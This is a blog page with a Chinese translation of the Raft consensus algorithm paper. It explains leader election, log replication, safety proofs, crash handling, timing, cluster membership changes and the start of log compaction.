<p>Raft 通过首先选举一个 distinguished leader，然后让它全权负责管理复制日志来实现一致性。Leader 从客户端接收日志条目，把日志条目复制到其他服务器上，并且在保证安全性的时候通知其他服务器将日志条目应用到他们的状态机中。拥有一个 leader 大大简化了对复制日志的管理。例如， Leader 可以决定新的日志条目需要放在日志中的什么位置而不需要和其他服务器商议，并且数据都是从 leader 流向其他服务器。leader 可能宕机，也可能和其他服务器断开连接，这时一个新的 leader 会被选举出来。</p>
<p>通过选举一个 leader 的方式，Raft 将一致性问题分解成了三个相对独立的子问题，这些问题将会在接下来的子章节中进行讨论：</p>
<ul>
<li>Leader 选举：当前的 leader 宕机时，一个新的 leader 必须被选举出来。（章节 5.2）</li>
<li>日志复制：Leader 必须从客户端接收日志条目然后复制到集群中的其他节点，并且强制要求其他节点的日志和自己的保持一致。</li>
<li>安全性：Raft 中安全性的关键是图 3 中状态机的安全性：如果有任何的服务器节点已经应用了一个特定的日志条目到它的状态机中，那么其他服务器节点不能在同一个日志索引位置应用一条不同的指令。章节 5.4 阐述了 Raft 算法是如何保证这个特性的；该解决方案在选举机制（5.2 节）上增加了额外的限制。</li>
</ul>
<p>在展示一致性算法之后，本章节将讨论可用性的一些问题以及时序在系统中的作用。</p>
<h3 id="5-1-Raft-基础"><a href="#5-1-Raft-基础" class="headerlink" title="5.1 Raft 基础"></a>5.1 Raft 基础</h3><p>一个 Raft 集群包含若干个服务器节点；通常是 5 个，这样的系统可以容忍 2 个节点的失效。在任何时刻，每一个服务器节点都处于这三个状态之一：leader、follower 或者 candidate 。在正常情况下，集群中只有一个 leader 并且其他的节点全部都是 follower 。Follower 都是被动的：他们不会发送任何请求，只是简单的响应来自 leader 和 candidate 的请求。Leader 处理所有的客户端请求（如果一个客户端和 follower 通信，follower 会将请求重定向给 leader）。第三种状态，candidate ，是用来选举一个新的 leader（章节 5.2）。图 4 展示了这些状态和他们之间的转换关系；这些转换关系在接下来会进行讨论。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/4.png"><br>图4</p>
<p>Raft 把时间分割成任意长度的任期（term），如图 5 所示。任期用连续的整数标记。每一段任期从一次选举开始，一个或者多个 candidate 尝试成为 leader 。如果一个 candidate 赢得选举，然后他就在该任期剩下的时间里充当 leader 。在某些情况下，一次选举无法选出 leader 。在这种情况下，这一任期会以没有 leader 结束；一个新的任期（包含一次新的选举）会很快重新开始。Raft 保证了在任意一个任期内，最多只有一个 leader 。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/5.png"><br>图5</p>
<p>不同的服务器节点观察到的任期转换的次数可能不同，在某些情况下，一个服务器节点可能没有看到 leader 选举过程或者甚至整个任期全程。任期在 Raft 算法中充当逻辑时钟的作用，这使得服务器节点可以发现一些过期的信息比如过时的 leader 。每一个服务器节点存储一个当前任期号，该编号随着时间单调递增。服务器之间通信的时候会交换当前任期号；如果一个服务器的当前任期号比其他的小，该服务器会将自己的任期号更新为较大的那个值。如果一个 candidate 或者 leader 发现自己的任期号过期了，它会立即回到 follower 状态。如果一个节点接收到一个包含过期的任期号的请求，它会直接拒绝这个请求。</p>
<p>Raft 算法中服务器节点之间使用 RPC 进行通信，并且基本的一致性算法只需要两种类型的 RPC。请求投票（RequestVote） RPC 由 candidate 在选举期间发起（章节 5.2），追加条目（AppendEntries）RPC 由 leader 发起，用来复制日志和提供一种心跳机制（章节 5.3）。第 7 节为了在服务器之间传输快照增加了第三种 RPC。当服务器没有及时的收到 RPC 的响应时，会进行重试， 并且他们能够并行的发起 RPC 来获得最佳的性能。</p>
<h3 id="5-2-Leader-选举"><a href="#5-2-Leader-选举" class="headerlink" title="5.2 Leader 选举"></a>5.2 Leader 选举</h3><p>Raft 使用一种心跳机制来触发 leader 选举。当服务器程序启动时，他们都是 follower 。一个服务器节点只要能从 leader 或 candidate 处接收到有效的 RPC 就一直保持 follower 状态。Leader 周期性地向所有 follower 发送心跳（不包含日志条目的 AppendEntries RPC）来维持自己的地位。如果一个 follower 在一段选举超时时间内没有接收到任何消息，它就假设系统中没有可用的 leader ，然后开始进行选举以选出新的leader。</p>
<p>要开始一次选举过程，follower 先增加自己的当前任期号并且转换到 candidate 状态。然后投票给自己并且并行地向集群中的其他服务器节点发送 RequestVote RPC（让其他服务器节点投票给它）。Candidate 会一直保持当前状态直到以下三件事情之一发生：(a) 它自己赢得了这次的选举（收到过半的投票），(b) 其他的服务器节点成为 leader ，(c) 一段时间之后没有任何获胜者。这些结果会在下面的章节里分别讨论。</p>
<p>当一个 candidate 获得集群中过半服务器节点针对同一个任期的投票，它就赢得了这次选举并成为 leader 。对于同一个任期，每个服务器节点只会投给一个 candidate ，按照先来先服务（first-come-first-served）的原则（注意：5.4 节在投票上增加了额外的限制）。要求获得过半投票的规则确保了最多只有一个 candidate 赢得此次选举（图 3 中的选举安全性）。一旦 candidate 赢得选举，就立即成为 leader 。然后它会向其他的服务器节点发送心跳消息来确定自己的地位并阻止新的选举。</p>
<p>在等待投票期间，candidate 可能会收到另一个声称自己是 leader 的服务器节点发来的 AppendEntries RPC 。如果这个 leader 的任期号（包含在RPC中）不小于 candidate 当前的任期号，那么 candidate 会承认该 leader 的合法地位并回到 follower 状态。 如果 RPC 中的任期号比自己的小，那么 candidate 就会拒绝这次的 RPC 并且继续保持 candidate 状态。</p>
<p>第三种可能的结果是 candidate 既没有赢得选举也没有输：如果有多个 follower 同时成为 candidate ，那么选票可能会被瓜分以至于没有 candidate 赢得过半的投票。当这种情况发生时，每一个 Candidate 都会超时，然后通过增加当前任期号来开始一轮新的选举。然而，如果没有其他机制的话，该情况可能会无限重复。</p>
<p>Raft 算法使用随机选举超时时间的方法来确保很少发生选票瓜分的情况，就算发生也能很快地解决。为了阻止选票一开始就被瓜分，选举超时时间是从一个固定的区间（例如 150-300 毫秒）随机选择。这样可以把服务器都分散开以至于在大多数情况下只有一个服务器会选举超时；然后该服务器赢得选举并在其他服务器超时之前发送心跳。同样的机制被用来解决选票被瓜分的情况。每个 candidate 在开始一次选举的时候会重置一个随机的选举超时时间，然后一直等待直到选举超时；这样减小了在新的选举中再次发生选票瓜分情况的可能性。9.3 节展示了该方案能够快速地选出一个 leader 。</p>
<p>选举的例子可以很好地展示可理解性是如何指导我们选择设计方案的。起初我们打算使用一种等级系统（ranking system）：每一个 candidate 都被赋予一个唯一的等级（rank），等级用来在竞争的 candidate 之间进行选择。如果一个 candidate 发现另一个 candidate 拥有更高的等级，它就会回到 follower 状态，这样高等级的 candidate 能够更加容易地赢得下一次选举。但是我们发现这种方法在可用性方面会有一下小问题。我们对该算法进行了多次调整，但是每次调整之后都会有新的小问题。最终我们认为随机重试的方法更加显然且易于理解。</p>
<h3 id="5-3-日志复制"><a href="#5-3-日志复制" class="headerlink" title="5.3 日志复制"></a>5.3 日志复制</h3><p>Leader 一旦被选举出来，就开始为客户端请求提供服务。客户端的每一个请求都包含一条将被复制状态机执行的指令。Leader 把该指令作为一个新的条目追加到日志中去，然后并行的发起 AppendEntries RPC 给其他的服务器，让它们复制该条目。当该条目被安全地复制（下面会介绍），leader 会应用该条目到它的状态机中（状态机执行该指令）然后把执行的结果返回给客户端。如果 follower 崩溃或者运行缓慢，或者网络丢包， Leader 会不断地重试 AppendEntries RPC（即使已经回复了客户端）直到所有的 follower 最终都存储了所有的日志条目。</p>
<p>日志以图 6 展示的方式组织。每个日志条目存储一条状态机指令和 leader 收到该指令时的任期号。任期号用来检测多个日志副本之间的不一致情况，同时也用来保证图 3 中的某些性质。每个日志条目都有一个整数索引值来表明它在日志中的位置。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/6.png"><br>图6</p>
<p>Leader 决定什么时候把日志条目应用到状态机中是安全的；这种日志条目被称为已提交的。Raft 算法保证所有已提交的日志条目都是持久化的并且最终会被所有可用的状态机执行。一旦创建该日志条目的 leader 将它复制到过半的服务器上，该日志条目就会被提交（例如在图 6 中的条目 7）。同时，leader 日志中该日志条目之前的所有日志条目也都会被提交，包括由其他 leader 创建的条目。5.4 节讨论在 leader 变更之后应用该规则的一些细节，并且证明了这种提交的规则是安全的。Leader 追踪将会被提交的日志条目的最大索引，未来的所有 AppendEntries RPC 都会包含该索引，这样其他的服务器才能最终知道哪些日志条目需要被提交。Follower 一旦知道某个日志条目已经被提交就会将该日志条目应用到自己的本地状态机中（按照日志的顺序）。</p>
<p>我们设计了 Raft 的日志机制来维持不同服务器之间日志高层次的一致性。这么做不仅简化了系统的行为也使得系统行为更加可预测，同时该机制也是保证安全性的重要组成部分。Raft 维护着以下特性，这些同时也构成了图 3 中的日志匹配特性：</p>
<ul>
<li>如果不同日志中的两个条目拥有相同的索引和任期号，那么他们存储了相同的指令。</li>
<li>如果不同日志中的两个条目拥有相同的索引和任期号，那么他们之前的所有日志条目也都相同。</li>
</ul>
<p>Leader 在特定的任期号内的一个日志索引处最多创建一个日志条目，同时日志条目在日志中的位置也从来不会改变。该点保证了上面的第一条特性。第二个特性是由 AppendEntries RPC 执行一个简单的一致性检查所保证的。在发送 AppendEntries RPC 的时候，leader 会将前一个日志条目的索引位置和任期号包含在里面。如果 follower 在它的日志中找不到包含相同索引位置和任期号的条目，那么他就会拒绝该新的日志条目。一致性检查就像一个归纳步骤：一开始空的日志状态肯定是满足 Log Matching Property（日志匹配特性） 的，然后一致性检查保证了日志扩展时的日志匹配特性。因此，每当 AppendEntries RPC 返回成功时，leader 就知道 follower 的日志一定和自己相同（从第一个日志条目到最新条目）。</p>
<p>正常操作期间，leader 和 follower 的日志保持一致，所以 AppendEntries RPC 的一致性检查从来不会失败。然而，leader 崩溃的情况会使日志处于不一致的状态（老的 leader 可能还没有完全复制它日志里的所有条目）。这种不一致会在一系列的 leader 和 follower 崩溃的情况下加剧。图 7 展示了在什么情况下 follower 的日志可能和新的 leader 的日志不同。Follower 可能缺少一些在新 leader 中有的日志条目，也可能拥有一些新 leader 没有的日志条目，或者同时发生。缺失或多出日志条目的情况可能会涉及到多个任期。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/7.png"><br>图7</p>
<blockquote>
<p>图 7：当一个 leader 成功当选时（最上面那条日志），follower 可能是（a-f）中的任何情况。每一个盒子表示一个日志条目；里面的数字表示任期号。Follower 可能会缺少一些日志条目（a-b），可能会有一些未被提交的日志条目（c-d），或者两种情况都存在（e-f）。例如，场景 f 可能这样发生，f 对应的服务器在任期 2 的时候是 leader ，追加了一些日志条目到自己的日志中，一条都还没提交（commit）就崩溃了；该服务器很快重启，在任期 3 重新被选为 leader，又追加了一些日志条目到自己的日志中；在这些任期 2 和任期 3 中的日志都还没被提交之前，该服务器又宕机了，并且在接下来的几个任期里一直处于宕机状态。</p>
</blockquote>
<p>在 Raft 算法中，leader 通过强制 follower 复制它的日志来解决不一致的问题。这意味着 follower 中跟 leader 冲突的日志条目会被 leader 的日志条目覆盖。5.4 节会证明通过增加一个限制可以保证安全性。</p>
<p>要使得 follower 的日志跟自己一致，leader 必须找到两者达成一致的最大的日志条目（索引最大），删除 follower 日志中从那个点之后的所有日志条目，并且将自己从那个点之后的所有日志条目发送给 follower 。所有的这些操作都发生在对 AppendEntries RPCs 中一致性检查的回复中。Leader 针对每一个 follower 都维护了一个 nextIndex ，表示 leader 要发送给 follower 的下一个日志条目的索引。当选出一个新 leader 时，该 leader 将所有 nextIndex 的值都初始化为自己最后一个日志条目的 index 加1（图 7 中的 11）。如果 follower 的日志和 leader 的不一致，那么下一次 AppendEntries RPC 中的一致性检查就会失败。在被 follower 拒绝之后，leaer 就会减小 nextIndex 值并重试 AppendEntries RPC 。最终 nextIndex 会在某个位置使得 leader 和 follower 的日志达成一致。此时，AppendEntries RPC 就会成功，将 follower 中跟 leader 冲突的日志条目全部删除然后追加 leader 中的日志条目（如果有需要追加的日志条目的话）。一旦 AppendEntries RPC 成功，follower 的日志就和 leader 一致，并且在该任期接下来的时间里保持一致。</p>
<blockquote>
<p>如果想要的话，该协议可以被优化来减少被拒绝的 AppendEntries RPC 的个数。例如，当拒绝一个 AppendEntries RPC 的请求的时候，follower 可以包含冲突条目的任期号和自己存储的那个任期的第一个 index 。借助这些信息，leader 可以跳过那个任期内所有冲突的日志条目来减小 nextIndex；这样就变成每个有冲突日志条目的任期需要一个 AppendEntries RPC 而不是每个条目一次。在实践中，我们认为这种优化是没有必要的，因为失败不经常发生并且也不可能有很多不一致的日志条目。</p>
</blockquote>
<p>通过这种机制，leader 在当权之后就不需要任何特殊的操作来使日志恢复到一致状态。Leader 只需要进行正常的操作，然后日志就能在回复 AppendEntries 一致性检查失败的时候自动趋于一致。Leader 从来不会覆盖或者删除自己的日志条目（图 3 的 Leader Append-Only 属性）。</p>
<p>这样的日志复制机制展示了第 2 节中描述的一致性特性：只要过半的服务器能正常运行，Raft 就能够接受，复制并应用新的日志条目；在正常情况下，新的日志条目可以在一个 RPC 来回中被复制给集群中的过半机器；并且单个运行慢的 follower 不会影响整体的性能。</p>
<h3 id="5-4-安全性"><a href="#5-4-安全性" class="headerlink" title="5.4 安全性"></a>5.4 安全性</h3><p>前面的章节里描述了 Raft 算法是如何进行 leader 选举和日志复制的。然而，到目前为止描述的机制并不能充分地保证每一个状态机会按照相同的顺序执行相同的指令。例如，一个 follower 可能会进入不可用状态，在此期间，leader 可能提交了若干的日志条目，然后这个 follower 可能会被选举为 leader 并且用新的日志条目覆盖这些日志条目；结果，不同的状态机可能会执行不同的指令序列。</p>
<p>这节通过对 leader 选举增加一个限制来完善 Raft 算法。这一限制保证了对于给定的任意任期号， leader 都包含了之前各个任期所有被提交的日志条目（图 3 中的 Leader Completeness 性质）。有了这一 leader 选举的限制，我们也使得提交规则更加清晰。最后，我们展示了对于 Leader Completeness 性质的简要证明并且说明该性质是如何领导复制状态机执行正确的行为的。</p>
<h3 id="5-4-1-选举限制"><a href="#5-4-1-选举限制" class="headerlink" title="5.4.1 选举限制"></a>5.4.1 选举限制</h3><p>在任何基于 leader 的一致性算法中，leader 最终都必须存储所有已经提交的日志条目。在某些一致性算法中，例如 Viewstamped Replication[22]，一开始并没有包含所有已经提交的日志条目的服务器也可能被选为 leader 。这种算法包含一些额外的机制来识别丢失的日志条目并将它们传送给新的 leader ，要么是在选举阶段要么在之后很快进行。不幸的是，这种方法会导致相当大的额外的机制和复杂性。Raft 使用了一种更加简单的方法，它可以保证新 leader 在当选时就包含了之前所有任期号中已经提交的日志条目，不需要再传送这些日志条目给新 leader 。这意味着日志条目的传送是单向的，只从 leader 到 follower，并且 leader 从不会覆盖本地日志中已经存在的条目。</p>
<p>Raft 使用投票的方式来阻止 candidate 赢得选举除非该 candidate 包含了所有已经提交的日志条目。 Candidate 为了赢得选举必须与集群中的过半节点通信，这意味着至少其中一个服务器节点包含了所有已提交的日志条目。如果 candidate 的日志至少和过半的服务器节点一样新（接下来会精确地定义“新”），那么他一定包含了所有已经提交的日志条目。RequestVote RPC 执行了这样的限制： RPC 中包含了 candidate 的日志信息，如果投票者自己的日志比 candidate 的还新，它会拒绝掉该投票请求。</p>
<p>Raft 通过比较两份日志中最后一条日志条目的索引值和任期号来定义谁的日志比较新。如果两份日志最后条目的任期号不同，那么任期号大的日志更新。如果两份日志最后条目的任期号相同，那么日志较长的那个更新。</p>
<h3 id="5-4-2-提交之前任期内的日志条目"><a href="#5-4-2-提交之前任期内的日志条目" class="headerlink" title="5.4.2 提交之前任期内的日志条目"></a>5.4.2 提交之前任期内的日志条目</h3><p>如同 5.3 节描述的那样，一旦当前任期内的某个日志条目已经存储到过半的服务器节点上，leader 就知道该日志条目已经被提交了。如果某个 leader 在提交某个日志条目之前崩溃了，以后的 leader 会试图完成该日志条目的复制。然而，如果是之前任期内的某个日志条目已经存储到过半的服务器节点上，leader 也无法立即断定该日志条目已经被提交了。图 8 展示了一种情况，一个已经被存储到过半节点上的老日志条目，仍然有可能会被未来的 leader 覆盖掉。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/8.png"><br>图8</p>
<blockquote>
<p>图 8：如图的时间序列展示了为什么 leader 无法判断老的任期号内的日志是否已经被提交。在 (a) 中，S1 是 leader ，部分地复制了索引位置 2 的日志条目。在 (b) 中，S1 崩溃了，然后 S5 在任期 3 中通过 S3、S4 和自己的选票赢得选举，然后从客户端接收了一条不一样的日志条目放在了索引 2 处。然后到 (c)，S5 又崩溃了；S1 重新启动，选举成功，继续复制日志。此时，来自任期 2 的那条日志已经被复制到了集群中的大多数机器上，但是还没有被提交。如果 S1 在 (d) 中又崩溃了，S5 可以重新被选举成功（通过来自 S2，S3 和 S4 的选票），然后覆盖了他们在索引 2 处的日志。但是，在崩溃之前，如果 S1 在自己的任期里复制了日志条目到大多数机器上，如 (e) 中，然后这个条目就会被提交（S5 就不可能选举成功）。 在这种情况下，之前的所有日志也被提交了。</p>
</blockquote>
<p>为了消除图 8 中描述的问题，Raft 永远不会通过计算副本数目的方式来提交之前任期内的日志条目。只有 leader 当前任期内的日志条目才通过计算副本数目的方式来提交；一旦当前任期的某个日志条目以这种方式被提交，那么由于日志匹配特性，之前的所有日志条目也都会被间接地提交。在某些情况下， Leader 可以安全地断定一个老的日志条目已经被提交（例如，如果该条目已经存储到所有服务器上），但是 Raft 为了简化问题使用了一种更加保守的方法。</p>
<p>Raft 会在提交规则上增加额外的复杂性是因为当 leader 复制之前任期内的日志条目时，这些日志条目都保留原来的任期号。在其他的一致性算法中，如果一个新的 leader 要重新复制之前的任期里的日志时，它必须使用当前新的任期号。Raft 的做法使得更加容易推导出（reason about）日志条目，因为他们自始至终都使用同一个任期号。另外，和其他的算法相比，Raft 中的新 leader 只需要发送更少的日志条目（其他算法中必须在它们被提交之前发送更多的冗余日志条目来给它们重新编号）。</p>
<h3 id="5-4-3-安全性论证"><a href="#5-4-3-安全性论证" class="headerlink" title="5.4.3 安全性论证"></a>5.4.3 安全性论证</h3><p>在给出了完整的 Raft 算法之后，我们现在可以更加精确的讨论 Leader 完整性特性（Leader Completeness Prop-erty）（这一讨论基于 9.2 节的安全性证明）。我们假设 Leader 完全性特性是不满足的，然后我们推出矛盾来。假设任期 T 的 leader（leader T）在任期内提交了一个日志条目，但是该日志条目没有被存储到未来某些任期的 leader 中。假设 U 是大于 T 的没有存储该日志条目的最小任期号。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/9.png"><br>图9</p>
<blockquote>
<p>图 9：如果 S1 （任期 T 的 leader）在它的任期里提交了一个新的日志条目，然后 S5 在之后的任期 U 里被选举为 leader ，那么肯定至少会有一个节点，如 S3，既接收了来自 S1 的日志条目，也给 S5 投票了。</p>
</blockquote>
<ol>
<li>U 一定在刚成为 leader 的时候就没有那条被提交的日志条目了（leader 从不会删除或者覆盖任何条目）。</li>
<li>Leader T 复制该日志条目给集群中的过半节点，同时，leader U 从集群中的过半节点赢得了选票。因此，至少有一个节点（投票者）同时接受了来自 leader T 的日志条目和给 leader U 投票了，如图 9。该投票者是产生矛盾的关键。</li>
<li>该投票者必须在给 leader U 投票之前先接受了从 leader T 发来的已经被提交的日志条目；否则它就会拒绝来自 leader T 的 AppendEntries 请求（因为此时它的任期号会比 T 大）。</li>
<li>该投票者在给 leader U 投票时依然保有这该日志条目，因为任何 U 、T 之间的 leader 都包含该日志条目（根据上述的假设），leader 从不会删除条目，并且 follower 只有跟 leader 冲突的时候才会删除条目。</li>
<li>该投票者把自己选票投给 leader U 时，leader U 的日志必须至少和投票者的一样新。这就导致了以下两个矛盾之一。</li>
<li>首先，如果该投票者和 leader U 的最后一个日志条目的任期号相同，那么 leader U 的日志至少和该投票者的一样长，所以 leader U 的日志一定包含该投票者日志中的所有日志条目。这是一个矛盾，因为该投票者包含了该已被提交的日志条目，但是在上述的假设里，leader U 是不包含的。</li>
<li>否则，leader U 的最后一个日志条目的任期号就必须比该投票者的大了。此外，该任期号也比 T 大，因为该投票者的最后一个日志条目的任期号至少和 T 一样大（他包含了来自任期 T 的已提交的日志）。创建了 leader U 最后一个日志条目的之前的 leader 一定已经包含了该已被提交的日志条目（根据上述假设，leader U 是第一个不包含该日志条目的 leader）。所以，根据日志匹配特性，leader U 一定也包含该已被提交的日志条目，这里产生了矛盾。</li>
<li>因此，所有比 T 大的任期的 leader 一定都包含了任期 T 中提交的所有日志条目。</li>
<li>日志匹配特性保证了未来的 leader 也会包含被间接提交的日志条目，例如图 8 (d) 中的索引 2。</li>
</ol>
<p>通过 Leader Completeness 特性，我们就能证明图 3 中的状态机安全特性，即如果某个服务器已经将某个给定的索引处的日志条目应用到自己的状态机里了，那么其他的服务器就不会在相同的索引处应用一个不同的日志条目。在一个服务器应用一个日志条目到自己的状态机中时，它的日志和 leader 的日志从开始到该日志条目都相同，并且该日志条目必须被提交。现在考虑如下最小任期号：某服务器在该任期号中某个特定的索引处应用了一个日志条目；日志完整性特性保证拥有更高任期号的 leader 会存储相同的日志条目，所以之后任期里服务器应用该索引处的日志条目也会是相同的值。因此，状态机安全特性是成立的。</p>
<p>最后，Raft 要求服务器按照日志索引顺序应用日志条目。再加上状态机安全特性，这就意味着所有的服务器都会按照相同的顺序应用相同的日志条目到自己的状态机中。</p>
<h3 id="5-5-Follower-和-candidate-崩溃"><a href="#5-5-Follower-和-candidate-崩溃" class="headerlink" title="5.5 Follower 和 candidate 崩溃"></a>5.5 Follower 和 candidate 崩溃</h3><p>到目前为止，我们只关注了 leader 崩溃的情况。Follower 和 candidate 崩溃后的处理方式比 leader 崩溃要简单的多，并且两者的处理方式是相同的。如果 follower 或者 candidate 崩溃了，那么后续发送给他们的 RequestVote 和 AppendEntries RPCs 都会失败。Raft 通过无限的重试来处理这种失败；如果崩溃的机器重启了，那么这些 RPC 就会成功地完成。如果一个服务器在完成了一个 RPC，但是还没有响应的时候崩溃了，那么在它重启之后就会再次收到同样的请求。Raft 的 RPCs 都是幂等的，所以这样的重试不会造成任何伤害。例如，一个 follower 如果收到 AppendEntries 请求但是它的日志中已经包含了这些日志条目，它就会直接忽略这个新的请求中的这些日志条目。</p>
<h3 id="5-6-定时（timing）和可用性"><a href="#5-6-定时（timing）和可用性" class="headerlink" title="5.6 定时（timing）和可用性"></a>5.6 定时（timing）和可用性</h3><p>Raft 的要求之一就是安全性不能依赖定时：整个系统不能因为某些事件运行得比预期快一点或者慢一点就产生错误的结果。但是，可用性（系统能够及时响应客户端）不可避免的要依赖于定时。例如，当有服务器崩溃时，消息交换的时间就会比正常情况下长，candidate 将不会等待太长的时间来赢得选举；没有一个稳定的 leader ，Raft 将无法工作。</p>
<p>Leader 选举是 Raft 中定时最为关键的方面。 只要整个系统满足下面的时间要求，Raft 就可以选举出并维持一个稳定的 leader：</p>
<blockquote>
<p>广播时间（broadcastTime） &lt;&lt; 选举超时时间（electionTimeout） &lt;&lt; 平均故障间隔时间（MTBF）</p>
</blockquote>
<p>在这个不等式中，广播时间指的是一个服务器并行地发送 RPCs 给集群中所有的其他服务器并接收到响应的平均时间；选举超时时间就是在 5.2 节中介绍的选举超时时间；平均故障间隔时间就是对于一台服务器而言，两次故障间隔时间的平均值。广播时间必须比选举超时时间小一个量级，这样 leader 才能够可靠地发送心跳消息来阻止 follower 开始进入选举状态；再加上随机化选举超时时间的方法，这个不等式也使得选票瓜分的情况变得不可能。选举超时时间需要比平均故障间隔时间小上几个数量级，这样整个系统才能稳定地运行。当 leader 崩溃后，整个系统会有大约选举超时时间不可用；我们希望该情况在整个时间里只占一小部分。</p>
<p>广播时间和平均故障间隔时间是由系统决定的，但是选举超时时间是我们自己选择的。Raft 的 RPCs 需要接收方将信息持久化地保存到稳定存储中去，所以广播时间大约是 0.5 毫秒到 20 毫秒之间，取决于存储的技术。因此，选举超时时间可能需要在 10 毫秒到 500 毫秒之间。大多数的服务器的平均故障间隔时间都在几个月甚至更长，很容易满足时间的要求。</p>
<h3 id="集群成员变更"><a href="#集群成员变更" class="headerlink" title="集群成员变更"></a>集群成员变更</h3><p>到目前为止，我们都假设集群的配置（参与一致性算法的服务器集合）是固定不变的。但是在实践中，偶尔会改变集群的配置的，例如替换那些宕机的机器或者改变复制程度。尽管可以通过使整个集群下线，更新所有配置，然后重启整个集群的方式来实现，但是在更改期间集群会不可用。另外，如果存在手工操作步骤，那么就会有操作失误的风险。为了避免这样的问题，我们决定将配置变更自动化并将其纳入到 Raft 一致性算法中来。</p>
<p>为了使配置变更机制能够安全，在转换的过程中不能够存在任何时间点使得同一个任期里可能选出两个 leader 。不幸的是，任何服务器直接从旧的配置转换到新的配置的方案都是不安全的。一次性自动地转换所有服务器是不可能的，所以在转换期间整个集群可能划分成两个独立的大多数（见图 10）。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/10.png"><br>图10</p>
<blockquote>
<p>图 10：直接从一种配置转到另一种配置是不安全的，因为各个机器会在不同的时候进行转换。在这个例子中，集群从 3 台机器变成了 5 台。不幸的是，存在这样的一个时间点，同一个任期里两个不同的 leader 会被选出。一个获得旧配置里过半机器的投票，一个获得新配置里过半机器的投票。</p>
</blockquote>
<p>为了保证安全性，配置变更必须采用一种两阶段方法。目前有很多种两阶段的实现。例如，有些系统（比如，[22]）在第一阶段停掉旧的配置所以不能处理客户端请求；然后在第二阶段在启用新的配置。在 Raft 中，集群先切换到一个过渡的配置，我们称之为联合一致（joint consensus）；一旦联合一致已经被提交了，那么系统就切换到新的配置上。联合一致结合了老配置和新配置：</p>
<ul>
<li>日志条目被复制给集群中新、老配置的所有服务器。</li>
<li>新、旧配置的服务器都可以成为 leader 。</li>
<li>达成一致（针对选举和提交）需要分别在两种配置上获得过半的支持。</li>
</ul>
<p>联合一致允许独立的服务器在不妥协安全性的前提下，在不同的时刻进行配置转换过程。此外，联合一致允许集群在配置变更期间依然响应客户端请求。</p>
<p><img src="/2018/03/04/Raft%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/11.png"><br>图11</p>
<p>集群配置在复制日志中以特殊的日志条目来存储和通信；图 11 展示了配置变更过程。当一个 leader 接收到一个改变配置从 C-old 到 C-new 的请求，它就为联合一致将该配置（图中的 C-old,new）存储为一个日志条目，并以前面描述的方式复制该条目。一旦某个服务器将该新配置日志条目增加到自己的日志中，它就会用该配置来做出未来所有的决策（服务器总是使用它日志中最新的配置，无论该配置日志是否已经被提交）。这就意味着 leader 会使用 C-old,new 的规则来决定 C-old,new 的日志条目是什么时候被提交的。如果 leader 崩溃了，新 leader 可能是在 C-old 配置也可能是在 C-old,new 配置下选出来的，这取决于赢得选举的 candidate 是否已经接收到了 C-old,new 配置。在任何情况下， C-new 在这一时期都不能做出单方面决定。</p>
<p>一旦 C-old,new 被提交，那么 C-old 和 C-new 都不能在没有得到对方认可的情况下做出决定，并且 leader 完整性特性保证了只有拥有 C-old,new 日志条目的服务器才能被选举为 leader 。现在 leader 创建一个描述 C-new 配置的日志条目并复制到集群其他节点就是安全的了。此外，新的配置被服务器收到后就会立即生效。当新的配置在 C-new 的规则下被提交，旧的配置就变得无关紧要，同时不使用新配置的服务器就可以被关闭了。如图 11 所示，任何时刻 C-old 和 C-new 都不能单方面做出决定；这保证了安全性。</p>
<p>在关于配置变更还有三个问题需要解决。第一个问题是，新的服务器开始时可能没有存储任何的日志条目。当这些服务器以这种状态加入到集群中，它们需要一段时间来更新来赶上其他服务器，这段它们无法提交新的日志条目。为了避免因此而造成的系统短时间的不可用，Raft 在配置变更前引入了一个额外的阶段，在该阶段，新的服务器以没有投票权身份加入到集群中来（leader 也复制日志给它们，但是考虑过半的时候不用考虑它们）。一旦该新的服务器追赶上了集群中的其他机器，配置变更就可以按上面描述的方式进行。</p>
<p>第二个问题是，集群的 leader 可能不是新配置中的一员。在这种情况下，leader 一旦提交了 C-new 日志条目就会退位（回到 follower 状态）。这意味着有这样的一段时间（leader 提交 C-new 期间），leader 管理着一个不包括自己的集群；它复制着日志但不把自己算在过半里面。Leader 转换发生在 C-new 被提交的时候，因为这是新配置可以独立运转的最早时刻（将总是能够在 C-new 配置下选出新的 Leader ）。在此之前，可能只能从 C-old 中选出 Leader 。</p>
<p>第三个问题是，那些被移除的服务器（不在 C-new 中）可能会扰乱集群。这些服务器将不会再接收到心跳，所以当选举超时，它们就会进行新的选举过程。它们会发送带有新任期号的 RequestVote RPCs ，这样会导致当前的 leader 回到 follower 状态。新的 leader 最终会被选出来，但是被移除的服务器将会再次超时，然后这个过程会再次重复，导致系统可用性很差。</p>
<p>为了防止这种问题，当服务器认为当前 leader 存在时，服务器会忽略RequestVote RPCs 。特别的，当服务器在最小选举超时时间内收到一个 RequestVote RPC，它不会更新任期号或者投票。这不会影响正常的选举，每个服务器在开始一次选举之前，至少等待最小选举超时时间。相反，这有利于避免被移除的服务器的扰乱：如果 leader 能够发送心跳给集群，那它就不会被更大的任期号废黜。</p>
<h3 id="日志压缩"><a href="#日志压缩" class="headerlink" title="日志压缩"></a>日志压缩</h3><p>Raft 的日志在正常操作中随着包含更多的客户端请求不断地增长，但是在实际的系统中，日志不能无限制地增长。随着日志越来越长，它会占用越来越多的空间，并且需要花更多的时间来回放。如果没有一定的机制来清除日志中积累的过期的信息，最终就会带来可用性问题。</p>
<p>快照技术是日志压缩最简单的方法。在快照技术中，整个当前系统的状态都以快照的形式持久化到稳定的存储中，该时间点之前的日志全部丢弃。快照技术被使用在 Chubby 和 ZooKeeper 中，接下来的章节会介绍 Raft 中的快照技术。</p>
